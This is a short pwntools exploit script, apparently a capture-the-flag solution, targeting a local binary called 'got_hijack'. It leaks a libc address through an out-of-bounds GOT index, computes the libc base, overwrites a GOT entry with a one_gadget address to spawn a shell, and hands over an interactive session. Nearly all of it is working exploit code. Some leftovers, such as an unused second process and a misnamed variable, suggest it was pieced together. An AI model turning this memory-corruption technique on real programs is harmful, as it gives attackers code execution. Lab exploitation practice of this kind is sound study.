#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

elf = ELF('./got_hijack')
p = process('./got_hijack')
libc_file = "../libc.so.6.md5.5898fac5d2680d0d8fefdadd632b7188"
libc = ELF(libc_file)
c = process("./rop-orw", env={'LD_PRELOAD': libc_file})
#gdb.attach(p, '''''')
offset = (elf.got['puts'] - elf.symbols['data']) // 8
print(offset)

offset = (elf.got['__isoc99_scanf'] - elf.symbols['data']) // 8
print(offset)

p.sendlineafter(':', str(offset))
p.recvuntil('=')

printf_addr = int(p.recvline().strip())
print(hex(printf_addr))
libc_base = printf_addr - libc.symbols['__isoc99_scanf']

one_gadget = libc_base + 0xe3b01
p.sendlineafter(':', str(one_gadget))
p.interactive()





